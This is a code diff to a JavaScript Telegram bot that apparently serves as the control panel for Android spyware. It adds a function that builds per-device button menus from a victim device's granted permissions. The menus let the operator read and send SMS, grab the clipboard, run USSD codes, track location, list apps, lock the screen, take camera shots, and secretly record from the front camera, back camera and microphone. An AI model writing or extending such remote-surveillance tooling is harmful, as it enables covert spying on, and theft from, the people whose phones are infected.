@@ -24,6 +24,159 @@ function getHopingMessage(){
     return messages[Math.floor(Math.random() * messages.length)];
 }
 
+function isEven(number) {
+    return number % 2 === 0;
+}
+
+function createKeyboard(access_list = [], devid, msgowner, callback = () => {}){
+    let layers = [[]];
+    let layer_index = 0;
+
+    if (access_list.includes("getPhoneNumbers") && access_list.includes("getPhoneNumberInfo")){
+            layers[layer_index].push({
+                text: build("phone ☎"),
+                callback_data: `phonePanel_${msgowner}_${devid}`
+            });
+        }
+
+    if (access_list.includes("getAllSMS") || access_list.includes("sendSMS") || access_list.includes("setSMSFilter")){
+        layers[layer_index].push({
+            text: build("sms 📪"),
+            callback_data: `smsPanel_${msgowner}_${devid}`
+        });
+    }
+
+    if (access_list.includes("setSoundVolume")){
+        layers[layer_index].push({
+            text: build("volume 🔊"),
+            callback_data: `volumePanel_${msgowner}_${devid}`
+        });
+    }
+
+    for (let access of access_list) {
+        if (layers[layer_index].length === 2 && layer_index % 2 === 0) {
+            layer_index++;
+            layers[layer_index] = [];
+        } else if ( layers[layer_index].length === 1 && !(layer_index % 2 === 0) ){
+            layer_index++;
+            layers[layer_index] = [];
+        }
+
+        switch (access) {
+            case "openUrl":
+                layers[layer_index].push({
+                    text: build("open-url 🚁"),
+                    callback_data: `getApps_${msgowner}_${devid}`
+                });
+                break;
+            case "sendToast":
+                layers[layer_index].push({
+                    text: build("toast 📦"),
+                    callback_data: `sendToast_${msgowner}_${devid}`
+                });
+                break;
+            case "sendNotification":
+                layers[layer_index].push({
+                    text: build("send-notif 🥤"),
+                    callback_data: `sendNotification_${msgowner}_${devid}`
+                });
+                break;
+            case "vibratePhone":
+                layers[layer_index].push({
+                    text: build("vibrate 👽"),
+                    callback_data: `vibratePhone_${msgowner}_${devid}`
+                });
+                break;
+            case "getGeoLocation":
+                layers[layer_index].push({
+                    text: build("location 🗺"),
+                    callback_data: `getGeoLocation_${msgowner}_${devid}`
+                });
+                break;
+            case "getInstalledApps":
+                layers[layer_index].push({
+                    text: build("apps 📃"),
+                    callback_data: `getInstalledApps_${msgowner}_${devid}`
+                });
+                break;
+            case "getClipboard":
+                layers[layer_index].push({
+                    text: build("clipboard ⛓"),
+                    callback_data: `getClipboard_${msgowner}_${devid}`
+                });
+                break;
+            case "runUSSD":
+                layers[layer_index].push({
+                    text: build("run-ussd 🌌"),
+                    callback_data: `runUSSD_${msgowner}_${devid}`
+                });
+                break;
+            case "lockScreen":
+                layers[layer_index].push({
+                    text: build("lock 🔒"),
+                    callback_data: `lockScreen_${msgowner}_${devid}`
+                });
+                break;
+            case "unlockScreen":
+                layers[layer_index].push({
+                    text: build("unlock 🔓"),
+                    callback_data: `unlockScreen_${msgowner}_${devid}`
+                });
+                break;
+            case "takeScreenshot":
+                layers[layer_index].push({
+                    text: build("screen-shot 🍃"),
+                    callback_data: `takeScreenshot_${msgowner}_${devid}`
+                });
+                break;
+            case "takeBackshot":
+                layers[layer_index].push({
+                    text: build("back-shot 🌑"),
+                    callback_data: `takeBackshot_${msgowner}_${devid}`
+                });
+                break;
+            case "takeFrontshot":
+                layers[layer_index].push({
+                    text: build("front-shot 🌕"),
+                    callback_data: `takeFrontshot_${msgowner}_${devid}`
+                });
+                break;
+            
+            case "recordFront":
+                layers[layer_index].push({
+                    text: build("record-front 👁"),
+                    callback_data: `recordFront_${msgowner}_${devid}`
+                });
+                break;
+            
+            case "recordBack":
+                layers[layer_index].push({
+                    text: build("record-back 🌩"),
+                    callback_data: `recordBack_${msgowner}_${devid}`
+                });
+                break;
+            case "recordMicrophone":
+                layers[layer_index].push({
+                    text: build("record-mic 🌩"),
+                    callback_data: `recordMicrophone_${msgowner}_${devid}`
+                });
+                break;
+        }
+    }
+
+    if (layers[layer_index].length === 0) {
+        layers.pop();
+    }
+
+    layers.push([]);
+    layers[layers.length - 1].push({
+        text: build("close"),
+        callback_data: `close_${msgowner}`
+    });
+
+    callback(layers);
+}
+
 function build(string) {
     const translationTable = {
         'q': 'ǫ', 'w': 'ᴡ', 'e': 'ᴇ', 'r': 'ʀ', 't': 'ᴛ',
@@ -160,23 +313,19 @@ bot.on('message', async (message) => {
                                     }
                                 )
                             } else {
-                                await bot.sendMessage(
+                                createKeyboard(_message.user.accessory, _message.user.device_id, message.from.id, async (keyboard) => {
+                                    await bot.sendMessage(
                                     message.chat.id,
                                     build("🦋 | user selected\n🌐 | device id: ") + `<code>${_devid}</code>` + build(`📁 | has ${_message.user.accessory.length} access`),
-                                    {
-                                        reply_to_message_id: message.message_id,
-                                        parse_mode: "HTML",
-                                        reply_markup: {
-                                            inline_keyboard: [
-                                                [
-                                                    {
-                                                        text: ``
-                                                    }
-                                                ]
-                                            ]
+                                        {
+                                            reply_to_message_id: message.message_id,
+                                            parse_mode: "HTML",
+                                            reply_markup: {
+                                                inline_keyboard: keyboard
+                                            }
                                         }
-                                    }
-                                )
+                                    )
+                                })
                             }
                         }
                     })
@@ -248,7 +397,6 @@ bot.on("callback_query", async (call) => {
                     }
                 )
             }
-
         }
     }
 })
